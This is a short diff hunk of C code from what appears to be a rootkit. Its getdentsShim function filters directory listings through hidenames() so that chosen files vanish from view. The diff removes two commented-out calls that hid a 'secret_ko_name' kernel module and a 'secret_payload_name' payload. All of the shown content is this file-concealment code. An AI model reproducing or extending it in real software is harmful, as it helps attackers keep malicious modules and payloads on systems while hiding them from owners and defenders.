@@ -175,8 +175,6 @@ int getdentsShim(int fd, char* buf, int BUF_SIZE) {
 	if (nread <= 0) {
 		return nread;
 	}
-	//hidename(buf, &nread, secret_ko_name, BUF_SIZE);
-	//hidename(buf, &nread, secret_payload_name, BUF_SIZE);
 	hidenames(buf, &nread, filepath, BUF_SIZE);
 
 	return nread;
